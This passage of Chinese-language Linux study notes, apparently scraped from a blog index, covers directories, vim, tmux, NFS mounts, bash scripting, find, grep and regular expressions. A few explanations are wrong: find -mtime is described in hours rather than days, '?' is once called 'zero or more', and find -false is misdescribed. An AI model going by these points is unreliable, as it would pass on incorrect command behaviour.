/sbin 存放的是管理员可执行的二进制文件 /home 普通用户的家目录 /root 超级管理员root用户的家目录 /boot 系统启动时引导目录 /etc 存放系统配置文件 /dev 存放设备文件 /var 存放在执行过程中经常变化的数据，例如日志、邮件等 /lib 存放系统使用的函数库，程序运行过程中会调用这些库 /usr 存放用户安装的一些软件的各种目录 /tmp 临时目录，存放各程序执行时产生临时文件 /lost+found 存放分区出现问题时的一些遗失片断，只有在单独分区里才会存在 /proc 虚拟目录，它实时记录当前系统的各种状态 /opt 存放扩展软件包的地方 /sys Linux设备模型文件夹，用于统一表示和操作计算机上的所有设备 /run centos自动挂载的文件夹 /media 默认用来挂载光盘等介质目录 /mnt 默认也是用来挂载 /misc 默认用于autofs挂载目录 四. VIM编辑器的使用 vi vim (增强版vi,现在各版本的linux都带有vim) 安装/升级vim sudo yum install vim 三种模式 普通模式(default) 快捷操作(定位, 删除 替换 查找) 可视模式 编辑模式 插入模式 替换模式 命令行模式 文档操作/扩展操作 vim newfile 新建一vim空白文件进行编辑 普通模式切换编辑模式: i/a/A/I/s/S/R/o/O/C 编辑模式切换普通模式: ESC 普通模式切换命令行模式: 冒号(:) 命令行模式切换普通模式: ESC 普通模式 定位 h/j/k/l 左下上右 ctrl + d/u/f/b 换页 b/w/e/B/W/E 单词定位 0 零 将光标定位到开头位置 ^ 将光标定位到开头有效字符位置 $ 将光标定位到行尾 G 将光标定位到最后一行 gg 将光标定位到第一行 命令行模式 :10 定位到第10行 :set nu 显示行号 :set nonu 不显示行号 vim 1_passwd +21 在打开文件的时候就跳到文件的21行 配置文件(配置vim初始功能) 全局配置 /etc/vimrc 用户配置 ~/.vimrc 将以下内容写入配置文件, 重启vim即可实现 set nu 选取(可视模式) v 按字符进行选取 V 按行进行选取 ctrl + v 按列进行选取 ggVG 全选 查找 / 查找 /hello 按回车进行高亮查找关键词 n/N 进行上下定位查找关键词 进入命令行输入 noh 取消高亮 删除 s 删除一个字符进入插入模式 S 删除一行进入插入模式 dd 删除一行 x 删除一个字符 撤消/重做 u 撤消 ctrl + r 重做撤消操作 复制/剪切/粘贴 yy 复制一行 yw 复制一个单词(要求光标在单词开头) p 粘贴到光标后面 P 粘贴到光标前面 数字前缀 10yy 复制10行 10dd 删除10行 命令行操作 :w 保存 :q 退出 :wq 保存退出 :w! 强制保存 :q! 强制退出 :qall 退出所有编辑文档 :w /tmp/new.file 另存为到/tmp/new.file :e /etc/passwd 打开文件 缓存区管理 列表缓存区 :ls 切换缓存区 :bn / :bp 标签管理 新建标签 :tabnew /tmp/hello.txt 切换标签 gt/gT :r 1.txt 将1.txt内容导入本编辑文档 :r! ls 将ls的标准输出导入本编辑文档 :vsp /tmp/hello.txt 竖向分屏编辑 :sp /tmp/hello.txt 横向分屏编辑 ctrl + w + w 替换 :1,$s/root/ROOT/g :10,20s/root/ROOT/g :%s/k365f/k365h/g 先选取再按:s/root/ROOT/g openoffice 办公软件 eog 图片查看器 gedit 文本编辑器 evince PDF浏览器 cal 日历 date 日期时间 date -s 修改日期和时间 date -d 计算日期 date +&quot;%Y&quot; 查看当前年 date +&quot;%F&quot; 查看当前年月日 date + &quot;%m&quot; 查看当前月 date + &quot;%d&quot; 查看当前日 bc 命令行计算器 yum insstall -y bc bc bc &lt;&lt;&lt; &quot;(5+4)/3&quot; bc &lt;&lt;&lt; &quot;scale=3;10/3&quot; bc &lt;&lt;&lt; &quot;ibase=2;101&quot; bc &lt;&lt;&lt; &quot;ibase=2;obase=16;1010&quot; echo 输出命令(脚本) echo &quot;hello world&quot; echo -e &quot;hello \\nworld\\n&quot; echo -n &quot;hello world&quot; 取消换行输出 echo &quot;$HOME&quot; 输出变量值 read 输入命令(脚本) read 如果没有指定变量，则写入REPLY变量 echo $REPLY read v 获取用户输入的内容 echo $v openssl 加密 /dev/null 空洞文件, 用于写 /dev/zero 用于读，永久都是二进制的零 /dev/urandom 用于读，永久都是随机二进制 五. tmux 开源的终端管理工具安装: centos7: sudo yum install tmux -y 配置文件 ~/.tmux.conf sudo mount 192.168.0.89:/soul /mnt cd /mnt/software cp tmux.conf ~/.tmux.conf 会话 - 解决客户端连接断开， 重连能还原最后操作界面 创建会话 在独立bash Shell中输入: tmux 或 tmux new-session -s 会话名称 查看会话列表 tmux list-session 分离会话(会话挂起) 在tmux终端内: ctrl + b d 或 ctrl + b D 唤醒会话 tmux attach -t 会话名称 选择会话 ctrl + b s 通过上下键进行按回车进行选择 关闭会话 将tmux所有终端退出，即关闭会话 tmux kill-session -t 会话名称 重命名会话名称 ctrl + b $ 窗口 一个会话当中至少要有一个窗口(标签显示) 创建窗口 ctrl + b c 关闭窗口 退出bash即关闭窗口 或 ctrl + b &amp; 列表窗口 ctrl + b w 选择窗口 选择第一个窗口: ctrl + b 0 选择第二个窗口: ctrl + b 1 ... 定制化的配置 alt + 1 ~ 9 窗格 一个窗口至少要有一个窗格(分屏显示) 创建窗格 竖分屏 ctrl + b | 横分屏 ctrl + b - 关闭窗格 ctrl + b x 选择窗格(切换) ctrl + b h/j/k/l 滚动窗口(剪切板操作) 复制: 进入vi操作复制模式 ctrl + b y 在复制模式下按v选取再按y可进行复制(退出复制模式) 粘贴: ctrl + b p 依赖配置及xclip工具 sudo yum install xclip -y ip a s ctrl + b y V y ctrl + b p 简单挂载 查看192.168.0.183有哪些共享文件夹 showmount -e 192.168.0.183 把192.168.0.89下面的/soul 挂在到本机的/mnt目录 sudo mount 192.168.0.183:/soul /mnt 切换工作目录到/mnt cd /mnt ls cd linux/2_linuxBasics ls vi 2_detail.txt 取消挂载 切换工作目录到根 cd / 取消挂载 sudo umount /mnt 强制取消挂载 sudo umount /mnt -l ntfs U盘挂载 sudo wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo sudo yum install ntfs-3g -y","link":"/2020/08/03/linux%E5%9F%BA%E7%A1%80/"},{"title":"linux_shell编程","text":"SHELL编程编程语言 机器语言 01010101低级语言(汇编语言) 助记词(转义器 将助记词编译成机器语言)高级语言 跨平台 编译型(编译器) 将标准文档转成对应平台的汇编 C / C++ 解析型(解析器) 将文档实时转义成平台指令 Shell PHP Python JavaScript, GO 编译解析型(编译器/虚拟机) Java C# PHP Python JS, 易, OC, swift 编程入口 编辑文档, 文档的第一行开始，逐行解析 SHELL解析器 /bin/bash #!/bin/bash 快捷键 快捷键模式 emacs 默认 ctrl + a ctrl + e ctrl + d ... vi 临时更换模式: set -o vi tab键补全 特殊符号 * 通配符 \\ 转义符, 去除后面字符的特殊意义 &quot;&quot; 批量转义符, 去除引号引起来的内容大部分特殊字符的特殊意义 '' 批量完成转义符, 去除引号引起来的内容所有特殊字符的特殊意义 `` 引起来内容当作shell命令去执行并且将执行标准输出替换, 尽量使用$() $()可以嵌套， 反引号不能嵌套 ``和$()都是开新进程去执行 {} 展开，代表多个的意思 字符串截取 数组的增. 删. 改. 查 变量的默认值 正则表达式匹配 awk () 子程序 $() &amp; 将程序放入后台执行(多进程) ! 命令历史特殊符号 ~ 当前登录用户的家目录 / 根 # 注释符 - 选项(标准输入) $ 组合使用， 访问变量 | 管道 &lt; &gt; &gt;&gt;.. 重定向 . 当前目录 .. 上一级目录 [ ] 判断表达式 : 永真(if while) ; 一条命令的结束 &amp;&amp; 逻辑与 前面的是&quot;真&quot;的才是会执行后面的 || 逻辑或 前面的是&quot;假&quot;的才是会执行后面的 命令历史 查看命令历史 history history 10 存储命令历史 history -w /tmp/history.txt 读取命令历史 history -r /tmp/history.txt 删除命令历史 history -c 执行命令执行 执行最后一条命令历史 !! 执行109的命令 !109 执行root开头的命令 !root 获取最后一条命令历史的最后一个参数 !$ 命令历史的环境变量 HISTFILE 控制命令历史默认写入的文件(~/.bash_history) echo $HISTFILE 打印环境变量的值 HISTFILESIZE 控制命令历史写入文件的最大条目 echo $HISTFILESIZE 打印环境变量的值 HISTSIZE 控制命令历史最大条目数 HISTTIMEFORMAT 控制命令历史时间显示格式 export HISTTIMEFORMAT=&quot;%F %T &quot; 命令别名 alias 简化命令的输入, 只影响当前终端 创建命令别名 格式: alias 别名='执行命令名字及参数' 例: alias i='ifconfig enp0s25' alias p='ping -c 3 192.168.2.1' alias pb='ping -c 3 www.baidu.com' 删除命令别名 格式: unalias 别名 查看命令别名 alias ​**环境变量**​ 提升程序运行效率, 将系统环境相关的信息存储到变量里，减少与内核交互​ 会影响子进程(将自己的环境变量复制给子进程)​​ 输出当前shell所有环境变量​ env​​ 访问环境变量的值​ echo $环境变量名​​ 定义和修改环境变量的值(PPP0)​ export 环境变量名=值​​ 删除环境变量​ unset 环境变量名​​ 配置文件​ bash启动时会执行配置文件(shell脚本)​ /.bashrc​​ 当bash结束时会自动将命令历史写入/.bash_history 学习编程语言的流程: 了解准备学习的语言概述 编程入口 变量的使用(数据类型) 操作符(操作变量) -&gt; 语句 流程控制语句(分支 循环) 函数(代码的打包) 数组 字符串处理 I/O文件操作 变量 变量默认没有数据类型之分, 一切皆于字符串 变量 : 以一组文字或符号来替换一些比较复杂或者容易变动的数据 变量的用途 简单的用途就是为了方便搜索 常用于编程里，对经常使用的值使用变量，方便引用 变量的分类 自定义变量 不影响子进程 环境变量 影响子进程 自定义变量转环境变量 export 自定义变量名 变量命名规则: 严格区分大小写，同名称但大小写不同的变量名是不同的变量 变量名可以是数字 字母特殊字符进行组合， 但不能以数字和特殊字符开头, 最好别用下划线开头更不能以纯数字为变量名 定义变量时两边不能有空格，有空格的字符串要用引号引起来 单引号和双引号的区别，单引号会转义所有特殊字符 尽可能描述变量存储的值(见名知意) 定义变量 变量名=值 =两边不能有空格 例: a=123 a=&quot;hello world&quot; a=34.6778 特殊的变量定义方式： var=`ls -l` 把ls -l的标准输出结果赋给var变量 a=$(ls -l) 将命令执行标准输出赋值给a变量 更新变量值 变量名=新值 num1=2333 num2=$(($num1 + 1000)) 结果是3333 num2=$[num1 + 1000] let num2=($num1 + 1000) 结果是3333 str1=&quot;hello world &quot; str2=$str1&quot;hello shell&quot; hello world hello shell 变量名+=追加值 获取变量值(PPP1) $变量名 或 ${变量名} 删除变量 unset 变量名 ${}的特殊访问 解决变量与其它字符串连接混乱问题 按位置进行截取(PPP2) ${变量名:起始值:截取个数} ${变量名:起始值:-从后面定位结束值} ${a:7} 从第8个开始到结束 ${var:0-7:3} 从倒数第7个开始， 截取3个 ${var:0-7} 从倒数第7个开始， 截取到最后 按关键词进行截取(PPP3)(PPP4) ${变量名#*关键词} 截取第一个关键词后面内容 ${变量名##*关键词} 截取最后一个关键词后面内容 ${变量名%关键词*} 截取最后一个关键词前面内容 ${变量名%%关键词*} 截取第一个关键词前面内容 获取字符串长度 ${#变量名} 替换(PPP5) ${变量名/查找关键词/替换关键词} 替换第一个关键词 ${变量名//查找关键词/替换关键词} 替换全部关键词 变量默认值(PPP6) echo ${变量名-默认值} 此变量名值为空或不存在，默认值才会使用 num=${1-$0} source或 . 内部命令, 使用本进程执行脚本, (默认情况下执行程序都开新进程) 内置变量$$ 代表本脚本的PID(进程标识符) (PPPz) 终端的pid是这个终端运行的脚本的PPID， 这个脚本中运行的sleep命令会开启子进程去运行， 脚本退出之后，里面sleep进程还是会继续运行， 只是变成了孤儿进程 12345678910111213141516171819$0 代表本脚本名$1 代表脚本的第一个参数$2 代表脚本的第二个参数$3 代表脚本的第三个参数...${10} 代表脚本的第十个参数...$n 代表脚本的第n个参数 $* 代表脚本的所有参数$@ 代表脚本的所有参数 假设在脚本运行时写了三个参数 1、2、3， 则 &quot; * &quot; 等价于 &quot;1 2 3&quot;(传递了一个参数), 而 &quot;@&quot; 等价于 &quot;1&quot; &quot;2&quot; &quot;3&quot;(传递了三个参数). $? 代表上一条命令执行返回码 (0代表正确，非0代表错误)(非0退出就是上条命令有问题) 赋值没有返回码 命令结果赋值的时候， 会把命令返回码的值作为$?的值 输入/输出语句(PPP7)echo/printf echo(见练习echo) -n 不换行输出 -e 启用反斜杠转义解释 \\c 最后不加上换行符号 printf &quot;%d%s\\n&quot; 34 &quot;hello&quot; &quot;%10d&quot; 按10个空位右对齐, 整个字符占10个位置， 不足补空格 &quot;%-10d&quot; 按10个空位左对齐， 整个字符占10个位置， 不足补空格 &quot;%010d&quot; 按10 个空位右对齐, 前面补0 &quot;%10.2f&quot; 按10个空位右对齐, 保留两位小数点 read -p 指定输入提示信息 -s 关闭回显 -n 指定输入最大字符个数 -t 指定超时时间(秒) 如果在read命令行中不指定变量的话，read命令会将它接收到的所有参数放到特殊环境变量REPLY中。 read var 等待用户给var变量赋值 read -p &quot;input your name:&quot; var 提示信息等待用户给var变量赋值 read -p &quot;input your name:&quot; -t 10 var 提示信息等待用户给var变量赋值,10秒不输入的话直接跳过 read -s -p &quot;input your password:&quot; passwd 提示信息等待用户给passwd变量赋值并且隐藏显示 一行多条命令执行 ; 以分号分隔多条命令顺序执行 &amp;&amp; 前面命令执行成功才会执行后面命令 || 前面命令执行失败才会执行后面命令 代码规范(可读性)加空行 使代码具有段落感 解析器和第一行代码之间要加空行 假如有连续定义多行变量， 在这之后要加空行 if/while/for/until/case 之间加空行 函数之间加空行 按代码功能分段加空行 缩进对齐 使代码具有层次感 缩进量为4个空格, 遇到if/while/for/until/case语句，里面内容进行缩进对齐 函数内部要缩进 加空格 使代码更清晰 双目操作符两边加空格(有左值右值的操作符) 命名规则 尽量能描述存储数据或功能 首字母小写驼峰法 gameStatus inputNum 首字母大写驼峰法 GameStatus InputNum 下划线连接 game_status input_num 强烈不建议使用中文和拼音 折行 一行不要超过80个字符(包含空白字符) 使用 \\ 进行连接行, \\后不能跟任何字符 流程控制语句分支(PPP8) 格式: if 命令; then 命令成功要执行的代码块 fi if 命令; then 命令成功要执行的代码块 else 命令失败要执行的代码块 fi if 命令1; then 命令1成功要执行的代码块 elif 命令2; then 命令2成功要执行的代码块 elif 命令3; then 命令3成功要执行的代码块 ... else 命令失败要执行的代码块 fi test命令(判断 条件表达式) test &quot;$a&quot; = &quot;$b&quot; 或 [ &quot;$a&quot; = &quot;$b&quot; ] 或 ((&quot;$a&quot; == &quot;$b&quot;)) [[ &quot;$a&quot; == &quot;$b&quot; ]] 得到条件表达式所有帮助 man test 整型数据比较: -le -lt -ge -gt -ne -eq -eq 等于,如:if [ &quot;$a&quot; -eq &quot;$b&quot; ] equal -ne 不等于,如:if [ &quot;$a&quot; -ne &quot;$b&quot; ] no equal -gt 大于,如:if [ &quot;$a&quot; -gt &quot;$b&quot; ] greater than -ge 大于等于,如:if [ &quot;$a&quot; -ge &quot;$b&quot; ] greater equal -lt 小于,如:if [ &quot;$a&quot; -lt &quot;$b&quot; ] less than -le 小于等于,如:if [ &quot;$a&quot; -le &quot;$b&quot; ] less equal &lt; 小于(需要双括号),如:((&quot;$a&quot; &lt; &quot;$b&quot;)) &lt;= 小于等于(需要双括号),如:((&quot;$a&quot; &lt;= &quot;$b&quot;)) &gt; 大于(需要双括号),如:((&quot;$a&quot; &gt; &quot;$b&quot;)) &gt;= 大于等于(需要双括号),如:((&quot;$a&quot; &gt;= &quot;$b&quot;)) 字符串比较: = != == (演练) = 等于,如:if [ &quot;$a&quot; = &quot;$b&quot; ] == 等于,如:if [ &quot;$a&quot; == &quot;$b&quot; ],与=等价 != 不等于， 如: if [ &quot;$a&quot; != &quot;$b&quot; ] 逻辑比较: -a -o ! ! 非，后面要跟空格 -o 或, 条件只要达成1个就是真(or) -a 且，条件必须全部达成才是真(and) 一些特殊的参数: -a 文件存在。 -e 文件存在（与-a相同）。 -n 字符串长度不是零。 -z 字符串长度为零。 -r 文件存在并且可由当前进程读取。 -w 文件存在并且可由当前进程写入。 -x 文件存在并且可由当前进程执行。 -d 文件存在并且是一个目录。 -f 文件存在并且是一个常规文件。 -s 文件存在且大小大于零。 -b 文件存在，是一个块特殊文件。 -c 文件存在，是一个字符特殊文件。 -G 文件存在，并具有与此进程相同的组ID。 -O 文件存在，并由该进程的用户ID拥有。 -l 文件存在，是一个符号链接。 -p 文件存在，是一个先入先出（FIFO）的特殊文件或命名管道。 -S 文件存在，是一个套接字。 if test -d &quot;/tmp&quot;; then echo &quot;判断/tmp是否存在且是个目录&quot; fi if [ -d &quot;/tmp&quot;]; then echo &quot;判断/tmp是否存在且是个目录&quot; fi 对变量最好使用双引号引起来， 保护起来， 以免报语法错误 case(处理菜单使用, 多路匹配)(PPP9) 格式: 简略版： case &quot;$num&quot; in A|a) echo &quot;A&quot;;; B|b) echo &quot;B&quot;;; C|c) echo &quot;C&quot;;; *) echo &quot;Other&quot;;; esac 完整版: case &quot;$num&quot; in A|a) echo &quot;A&quot; ;; B|b) echo &quot;B&quot; ;; C|c) echo &quot;C&quot; ;; *) echo &quot;Other&quot; ;; esac 循环(PPP11 PPP10) 循环控制语句 break 退出循环 continue 跳过本次循环 while(演练目录) 格式: while 命令(条件表达式); do 循环代码块 done 命令成功或条件表达式为真才会执行循环体 until 格式: until 命令(条件表达式); do 循环代码块 done 命令失败或条件表达式为假才会执行循环体 for(用for循环去做PPP5) 格式: for 迭代变量 in 迭代对象 ; do 循环代码块 done 迭代对象是以空格为分隔符序列 for i in 1 2 3 4 5 6 7 8 9 10; do echo $i done for i in 1 2.334 &quot;hello&quot; &quot;1.txt&quot; 5 678.45 7 8 9 10; do echo $i done for ((i = 0; i &lt; 5; i++)); do echo $i done seq 产生一个序列， 可进行迭代 count=18 for i in $(seq 0 $count); do echo $i done 函数 打包代码(PPP23 PPP24)函数定义格式: [function] 函数名 () { 函数代码块 } 函数调用格式: 函数名 [参数]… 函数就是命令，与命令用法一样 exit和return后面接的必须是0-255的数字 小于0会报错， 且最终的值是一个1-255的随机数字， 大多数是2 大于255, 最终的值是一个1-255的随机数字， 大多数是1 返回的不是数字， 会报错， 且返回的状态码是1-255之间的一个随机数字 函数中出现了return， 执行到这一行的时候就会结束，这个函数下面的代码不会执行了 在脚本中， 碰到exit会直接退出脚本， 下面的代码不会再执行 注意点: 1. shell是面向过程的语言， 从上到下依次执行(类似C语言) 2. 定义的变量要在使用之前，不然值是空的 3. 定义函数要在使用之前， 不然会报错 4. 函数外和函数内通信可以以传参的形式, 改变共同使用的变量 5. 函数内和函数外通信可以使用的标准输出的形式(echo/printf)和return/exit 6. 函数名要和变量名的起名规则是一样的， 做到见名知意 7. 函数不调用不执行 8. 假如函数名和linux的命令起冲突的时候， 会先执行自定义的函数 数组 与变量一样是存储数据 批量操作同类型的数据 SHELL只支持一维数组 数组不能直接作为函数参数进行传递 定义 1. 索引数组 declare -a 数组名 数组名=(值1 值2 值3…) 2. 键值对数组 declare -A 数组名 数组名=([“name1”]=soul [“name2”]=shell) 数组名[键]=值 3. 索引键值对混合数组(强烈不建议使用) 只是shell的语法允许这样做，但是正常使用的时候不要这样用 数组名[键]=值 数组名=(值1 值2 值3...) 访问(演练) 访问指定元素 echo ${数组名[下标]} 下标是正整数, 从0开始描述数组的第几个元素 下标是负整数, 倒数第几个， 从1开始 下标是-0就相当于是0 下标是浮点数会报错 echo ${数组名[键名]} 访问所有元素 echo ${数组名[*]} echo ${数组名[@]} 访问数组长度 ${#数组名[*]} ${#数组名[@]} 访问数组所有键名 ${!数组名[*]} ${!数组名[@]} 索引数组的键名类似于{0..n} 更新 更新数组的指定元素 数组名[下标]=新值 数组名+=(追加值1 追加值2...) 给数组追加一个变量 a=(1 2 3 4) num=5 a[${#a[*]}]=$num 删除(PPP12) 删除数组指定元素 unset 数组名[下标] 只是清空对应下标元素的值, 并不会改变数组其它元素的位置 a=(1 2 3 4 5) len1=${#a[*]} &lt;-- 5 unset a[3] &lt;-- 删除下标为3的元素 len2=${#a[*]} &lt;-- 4 for i in &quot;${a[*]}&quot;; do echo &quot;$i&quot; &lt;-- 这种算法不能把a[3]的实际值打出来 这个时候打印的第4个数字只是第4个数字 而不是a[3]的值 done x=0 for i in &quot;${a[*]}&quot;; do echo &quot;下标为$x&quot;&quot;的值是: ${a[$x]}&quot; &lt;-- 这个时候打印的第4个数字才是a[3]的值 let x+=1 done 删除整个数组 unset 数组名 declare 定义只读变量(常量) declare -r 只读变量名=值 定义索引数组 declare -a 数组名 定义键值对数组 declare -A 数组名 定义自动转化大写的变量 declare -u 变量名 给此变量名赋值，会自动转成大写 定义自动转化小写的变量 declare -l 变量名 给此变量名赋值，会自动转成小写 定义环境变量 declare -x 环境变量名 变量作用域 $* 和 $@的区别: 它们的区别在于使用双引号, $*代表一个元素， $@代表多个元素 函数直接可以访问和修改函数外的变量 shell里的变量都是全局变量, 在函数里定义的变量在函数调用后也可以直接访问 在函数内可以使用local关键词定义局部变量 (只能在函数中使用) 查找命令which 查找$PATH变量指定的目录里的命令 which ifconfig 查出ifconfig命令的路径 whereis 查找命令，显示命令更多的信息 whereis ifconfig 命令路径，帮助文档等 locate 文件查找命令 速度快，通过系统自带的一个数据库去查找 /var/lib/mlocate/mlocate.db locate hello 查找带hello的文件,如果hello是刚刚新建的就找不到，因为数据库还没有没保存现在的信息 updatedb 手动更新查找数据库，然后再查找就会很快找到刚刚新建的hello文件 find文件查找命令，功能最强大，速度慢，因为会扫描整个查找的范围 find 范围 参数 关键字 find /etc -name grub.conf 查找/etc目录下的grub.conf文件 find / -name &quot;*.conf&quot; 查找/下所有.conf文件 find / -iname grub.conf 查找/目录下的grub.conf文件，忽略大小写 find / -maxdepth 2 -name grub.conf 可以使用-maxdepath参数来控制查找的层次，就是说只查当前目录和子目录,最多查2级目录 find / -mindepth 2 -name grub.conf 最少查二级目录 find /etc -type d 查找/etc/下所有的目录 find /etc -type f 查找/etc/下的所有普通文件 find /etc -type l -name &quot;*.conf&quot; 查找/etc/下软链接文件是.conf结尾的文件 find /etc -type s 查找/etc/下所有socket文件 find /etc -type c 查找/etc/下的所有字符设备文件 find /etc -type p 查找/etc/下所有管道文件 find /etc -user root 查找/etc/所属用户是root的文件 find /etc -group root 查找/etc/所属用户组是root的文件 find /etc -uid 500 查找/etc/下uid是500的文件,和-user类似 find /etc -gid 500 查找/etc/下gid是500的文件,和-group类似 find /etc -nouser 查找没有所属用户的文件 find /etc -nogroup 查找没有所属用户组的文件 find /etc -perm 777 -type d 查找/etc/下权限为777的目录 find . -perm 111 查找权限是111的文件 find . -size +10M 查找当前目录下大于10M的文件，单位可以有K,M,G,b等 find / -size -2M 查找根目录下少于2M的文件 find / -size +10M -size -100M 查找跟目录下面大于10M且小于100M的文件 find / -mtime 1 查找根目录下1小时以前修改的所有文件 find / -mtime +2 查找根目录下2个多小时以前修改的所有文件 find / -mtime -3 查找根目录下最近3小时内修改的所有文件 find / -atime 1 查找根目录下1天以前访问或读过的所有文件 find / -atime -1 查找根目录下最近1天内读过或访问的文件 find / -ctime -3 查找根目录下最近3天内状态发生改变的文件 find / -cmin -3 查找根目录下最近3分钟内状态发生改变的文件 find / -empty 查找根目录下所有空白文件或者空目录 find / -false 查找根目录下总是错误的文件 find / -false -exec ls -l {} \\; 查找根目录下总是错误的文件并且用ls -l查看 exec 把前面命令的输出作为后面命令的参数 对find出来的文件进行进一步的操作 用ls -hl格式化输出/root下面属于root的大于10M的普通文件 find / -size +10M -user root -type f 2&gt; /dev/null -exec ls -hl &quot;{}&quot; \\; PPP13 文本处理工具wc 统计命令 wc -c /etc/passwd 统计/etc/passwd文件里有多少个字符 wc -w /etc/passwd 统计/etc/passwd文件里有多少个单词 wc -l /etc/passwd 统计/etc/passwd文件里有多少行 sort 排序命令 sort -f /etc/passwd 忽略大小写排序 sort -b /etc/passwd 忽略最前面的空格符部分 sort -n /etc/passwd 按数字大小排序 sort -u /etc/passwd 去除重复行显示 sort -r /etc/passwd 反向排序 sort -n -k5 /etc/passwd 指定第五列进行按数字大小排序 sort -t: -n -k5 /etc/passwd 以:为分隔符指定第五列按数字大小排序 cut 字段截取cut -d: -f1 /etc/passwd 以：为分隔符， 只显示第一列数据 cut -d: -f1,2,5 /etc/passwd 只显示第一列，第二列，第五列的数据 cut -d: -f1,2 /etc/passwd 以:为分隔符只显示第一列，第二列的数据 uniq 去除文件中相邻的重复行 uniq -u /etc/passwd 只显示没有被重复过的行 重复行不显示 uniq -d /etc/passwd 只显示被重复过的行 重复的行中间只显示一行 uniq -i /etc/passwd 忽略大小写去除文件中相邻的重复行 重复的行中间只显示一行 uniq -c /etc/passwd 统计相邻重复行数 diff 比较文件差异diff -B /etc/passwd passwd 忽略空行造成的不同 3a4,6 表示4行和6行文件内容不一样， &gt; i 表示不一样的字符内容 &gt; &gt; 9 -c 显示全部内文，并标出不同之处,用!号标出 diff -c /etc/passwd passwd 说明： &quot;|&quot;表示前后2个文件内容有不同 &quot;&lt;&quot;表示后面文件比前面文件少了1行内容 &quot;&gt;&quot;表示后面文件比前面文件多了1行内容 tr 替换字符 cat /etc/passwd | tr a b 查看/etc/passwd文件并把里面的a替换成b tr a-z A-Z &lt; /etc/passwd 把/etc/passwd文件里的小写全转成大写 不会修改源文件，输出到标准输出 grep 文本查找(查找到结果打印对应行)格式: grep 参数 关键词 [文件路径]... 当有参数r的时候, 没有写文件路径的话就是在当前文件 参数 -r 递归查找文件 -n 输出行号 -i 忽略大小写 -l 只输出路径 -w 完全匹配 -q 查找的结果不输出 -A 输出结果后面的行(包括查找结果行) -B 输出结果前面的行(包括查找结果行) -v 输出没有关键词的行 -o 代表的是只输出匹配的选项。 在passwd文件中查找root输出对应行内容 grep root /etc/passwd 在passwd文件中查找root输出对应行内容并且带行号 grep -n root /etc/passwd 在passwd文件中查找nfs输出结果后3行(包含查找结果行) grep -A 3 nfs /etc/passwd 在passwd文件中查找nfs输出结果前3行 grep -B 3 nfs /etc/passwd 在passwd文件中查找nfs输出结果前3行后2行 grep -A 2 -B 3 nfs /etc/passwd 在多个文件中查找root关键词并且带颜色输出结果(文件名:行号:行内容) grep -rn root ./ 在一个目录下所有文件查找root关键词 grep -r root ./ 在一个目录下的所有文件查找root关键词，只输出有结果的文件路径 grep -rl root ./ 查找没有root关键词的行 小写-v grep -v root /etc/passwd 查找多个关键词(逻辑或的关系) grep --color=auto -e 'bin' -e 'nologin' /etc/passwd 查找单词(关键词) grep -w root /etc/passwd 忽略大小写查找 grep -i root /etc/passwd 关闭输出查找(用于shell判断使用) grep -q root /etc/passwd 使用扩展正则表达式(egrep) grep -E 'a+' /etc/passwd 或 egrep 'a+' /etc/passwd 2 : egrep = grep -E 可以使用基本的正则表达外, 还可以用扩展表达式. 注意区别. 扩展表达式: + 匹配一个或者多个先前的字符, 至少一个先前字符. ? 匹配0个或者多个先前字符. a|b|c 匹配a或b或c () 字符组, 如: &quot;love(able|ers)&quot; 匹配loveable或lovers. (..)(..)\\1\\2 模板匹配. \\1代表前面第一个模板, \\2代第二个括弧里面的模板. x{m,n} =x\\{m,n\\} x的字符数量在m到n个之间. basename $(pwd) 取得当前目录名 pwd | awk -F ‘/‘ ‘{print $NF}’ dirname $(pwd) 取得当前路径，不包含当前目录名 pwd | sed -nr ‘s/(.)(/)(.)$/\\1\\2/p’ script_dir=$( cd $(dirname “$0”) &amp;&amp; pwd ) 表示脚本所在目录的 tac 倒转文件里的内容 rev 倒转文件里的单词顺序 正则表达式 (字符串匹配 模糊匹配)名字叫正规表示法 . 代表任意一个字符 r... 代表r开头的任意四个字符 \\&lt;root 代表root开头的单词 root\\&gt; 代表root结尾的单词 \\&lt;root\\&gt; 代表完全匹配root单词 \\b &lt;-- 单词边界 \\B &lt;-- 非单词边界 ^ 代表行开头 ^root 代表以root开头的行 $ 代表行结尾 root$ 代表以root结尾的行 * 匹配前一个字符0次或n次 a* 匹配0个a到多个a .* 匹配0个到n个任意字符 + 匹配前一个字符1次或n次(至少要有一个) a+ 匹配至少一个a ? 匹配前一个字符0次或1次 a? 匹配一个a或没有a 默认情况下，数量表示符只作用于前面的【一个】字符，如果需要作用于 前面的多个字符，可以使用(...)把前面的字符括起来 ab+ 匹配ab, abb, abbb, abbbb... (ab)+ 匹配ab, abab, ababab, abababab... {} 匹配前一个字符指定次数 a{1} 匹配一个a a{0,1} 与a?功能相同 a{0,} 与a*功能相同 a{1,} 与a+功能相同 a{1,3} 匹配一个a 或 二个a 或三个a 这些数字可以是任意的正整数 [] 字符类 匹配一个字符 [abc] 匹配这个字符必须是a或b或c [^abc] 匹配这个字符不是abc的其它任意字符 [a-z] 匹配26个小写字母 [0-9] 匹配0到9的字符 [a-zA-Z0-9_] 匹配数字 大小写字母和下划线 [a-zA-Z]+ 匹配单词 [^a-zA-Z]+ 匹配单词分隔符 预定义字符类 [[:alnum:]] 字母和数字的组合，相当于[a-zA-Z0-9] [[:digit:]] 十进制数字 [0-9] [[:alpha:]] 字母组合 [a-zA-Z] [[:blank:]] 空格和制表符 [[:punct:]] 特殊字符集合 ... \\ 转义 \\. 取消.的特殊意义 \\n 代表换行 \\d 任意一个十进制数字 [0-9] \\D 任意一个不是数字的字符 [^0-9] \\s 任意一个空白字符 [ \\f\\n\\r\\t] \\w 任意一个单词字符 [a-zA-Z0-9_] \\W [^a-zA-Z0-9_] | 代表或 a|b 匹配a或b () 子表达式 (root)|(kyo) 匹配root或kyo 默认情况下，数量表示符是最大匹配，好的正则表达式引擎支持用问号 ? 来启用最小匹配 .*b 匹配 aaabababa &lt;-- 最大匹配 ^^^^^^^^ .*?b 匹配 aaabababa &lt;-- 最小匹配 ^^^^ 引用表示法 -------------------------------------------------------------- 从左边开始数左小括号(openning brace)，数字从1开始，被第一对括号匹配的字符 可以用\\1 来引用，第二对可以用\\2 来引用，以此类推。 echo abcabcabcaabb | grep -E '(a(bc)){2}\\1' --color abcabcabcaabb echo abcabcabcaabb | grep -E '(a(bc)){2}a\\2' --color abcabcabcaabb echo &quot;hello world, hello world, hello beautiful world&quot; \\ | grep -E --color '((hello) (world)), \\1, \\2 .* \\3' hello world, hello world, hello beautiful world PPP14 sed 